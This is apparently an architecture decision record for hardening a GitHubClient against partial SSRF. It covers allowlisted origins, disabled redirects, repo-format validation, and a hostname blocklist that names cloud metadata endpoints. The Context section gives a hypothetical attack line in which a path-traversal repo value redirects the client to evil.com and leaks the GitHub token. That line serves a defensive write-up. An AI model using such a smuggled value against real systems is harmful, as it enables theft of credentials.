# ADR-028: Transport Boundary for GitHubClient (SSRF Mitigation)

**Status:** ACCEPTED (partially superseded by Issue #72 / ADR-028 Addendum)
**Issue:** #57, Code Scanning alert #2 (`py/partial-ssrf`)
**Date:** 2026-10-03
**Deciders:** dev-backend

> **ADR-028 Addendum (Issue #72, 2026-10-05):** The hardcoded allowlist decision (D1)
> has been superseded. Sections "D1 (superseded)", "GitHub Enterprise Support (superseded)"
> below are retained for historical reference. See the "ADR-028 Addendum" section at the
> end of this document for the current policy.

## Context

`GitHubClient` accepts an arbitrary `base_url` constructor parameter and passes it
directly to `httpx.AsyncClient`. The `repo` value (from `GITHUB_REPO` env var) is
interpolated into the request path without validation.

GitHub's API at `https://api.github.com` issues 301/302 redirects — for example, when
resolving a merged PR — which `httpx` follows by default. An attacker who controls the
`base_url` or `repo` could redirect the client to an arbitrary host:

```python
# Hypothetical attack via GITHUB_REPO
gh = GitHubClient(token="ghp_...", repo="../../@evil.com/redirect?")
# httpx follows redirect to https://evil.com/redirect?/repos/owner/repo/issues/...
```

This is a **partial SSRF** (Server-Side Request Forgery): the attacker cannot inject a
fully arbitrary URL into the request, but they can redirect the transport to an arbitrary
host, exfiltrating the GitHub token to an attacker-controlled endpoint.

### Exploitability analysis

The token is embedded in an `Authorization: Bearer` header. For the attack to succeed:

1. The attacker must control `base_url` or `repo` (e.g., via `GITHUB_REPO` env or config).
2. GitHub's API must return a redirect to an attacker-controlled host.
3. The `repo` path traversal vector requires GitHub to follow a relative redirect that
   httpx resolves against the `base_url` — unlikely in practice, but the risk is non-zero.

**Conclusion:** The vulnerability is exploitable under the assumption that an attacker can
set environment variables or config — a reasonable production threat model. The fix must
be fail-closed regardless of how `base_url` or `repo` are set.

## Decision

1. **D1 (superseded by Issue #72): Whitelist `base_url` by operator configuration.**
   Originally: only `https://api.github.com`, `https://github.com/api/v3`, and `http://127.0.0.1`
   were hardcoded. Now: origins are operator-configurable via config file or environment variable,
   validated with strict SSRF-safe rules at startup. See the Addendum below.
2. **Disable redirect following** — `follow_redirects=False` prevents httpx from following
   any redirect, eliminating the redirect-to-arbitrary-host vector.
3. **Validate `repo` format** — must match `owner/repo` (alphanumeric, hyphens, underscores,
   dots). Rejects path-traversal attempts.
4. **Connection limits** — `Limits(max_keepalive_connections=1, max_connections=2)` prevents
   connection pooling abuse and keeps the transport scoped to a single logical channel.
5. **Request timeout** — `httpx.Timeout(10.0, connect=5.0)` bounds both overall and
   connection establishment time.
6. **`verify` parameter** — `httpx.AsyncClient(verify=...)` is exposed as a constructor
   argument (default `True`). Set to `False` only for local test fixtures with
   self-signed certificates.

## Consequences

- **Positive:** SSRF risk eliminated. CodeQL `py/partial-ssrf` alert resolves.
- **Negative (superseded by Issue #72):** Custom GitHub Enterprise URLs were blocked by the
  hardcoded allowlist. Issue #72 resolves this by replacing the hardcoded allowlist with
  operator-configurable origins that are validated with strict SSRF rules.
- **Neutral:** The `Limits` and `Timeout` settings are conservative; they can be relaxed
  if performance profiling shows they are a bottleneck.

## GitHub Enterprise Support (superseded by Issue #72)

Originally: adding a GHES URL required editing `github_client.py:_ALLOWED_BASE_URLS`.
Issue #72 supersedes this — GHES is now configured via `github.origins` in
`config/production.yaml` or `OPSWARM_GITHUB_ORIGINS` environment variable, with
operator-configurable origins validated at startup.

---

## ADR-028 Addendum: Operator-Configurable Origins (Issue #72)

**Date:** 2026-10-05
**Status:** ACCEPTED
**Issue:** #72

### Motivation

The original ADR-028 hardcoded `_ALLOWED_BASE_URLS = {"https://api.github.com",
"https://github.com/api/v3", "http://127.0.0.1"}`, which prevented GHES deployments
without source-code edits. This blocked enterprise adoption.

### Decision

1. **D1 (new): Operator-configurable origins with SSRF validation.**
   - Origins are read from `github.origins` in `config/production.yaml` (YAML list)
     or from `OPSWARM_GITHUB_ORIGINS` (comma-separated, no spaces).
   - A frozenset of approved origins is built at startup via `build_allowed_origins_set()`.
   - `GitHubClient` receives this frozenset as `allowed_origins` and raises `ValueError`
     if `base_url` is not in the set — fail-closed on misconfiguration.
   - The set is stored as `self.allowed_origins` for introspection.

2. **D2: SSRF-safe origin validation.**
   Every origin is validated by `_is_safe_origin()` with these rules:
   - **Scheme:** HTTPS required in production; HTTP permitted only in `test`/`dev` profiles.
   - **Hostname:** Must not be on the blocklist (`localhost`, `127.0.0.1`, `0.0.0.0`,
     `169.254.169.254`, `metadata.google.internal`, `metadata.azure.com`).
   - **No IP addresses** in production (except in `test`/`dev`).
   - **Port:** optional, must be 1–65535.
   - **No userinfo, query, fragment** components.
   - **No non-root path** beyond `/`.
   - **Exact URL match:** substring/prefix/suffix tricks are impossible by design.

3. **D3: Enterprise CA bundle.**
   - `github.ca_bundle` in YAML or `OPSWARM_GITHUB_CA_BUNDLE` env var.
   - Empty (default): system CA bundle (`verify=True`).
   - Non-empty path: passed as a string to `httpx.AsyncClient(verify=path)` — a custom
     PEM bundle, TLS verification remains enabled.
   - `verify=False` is prohibited in production (`test`/`dev` profiles only).

4. **D4: Startup diagnostics.**
   - `get_effective_origin_diagnostic()` logs origin count and first origin at startup —
     safe: no credentials, tokens, or secrets exposed.
   - Log line: `GitHub origins configured: 1 origin(s), first=https://ghes.example.com  (ca_bundle=custom=/path/to/bundle.pem)`

5. **D5: Backward compatibility.**
   - Direct `GitHubClient(token, repo)` construction without `allowed_origins` defaults
     to `{_DEFAULT_ORIGIN}` — preserves existing tests and ad-hoc usage.
   - `build_allowed_origins_set([])` raises `ValueError` — an empty origins list is invalid.

### Consequences

- **Positive:** GHES configurable without source-code edits; SSRF hardening preserved.
- **Negative:** None — this is strictly additive.
- **Neutral:** Existing deployments using GitHub.com are unaffected (default remains
  `https://api.github.com`).
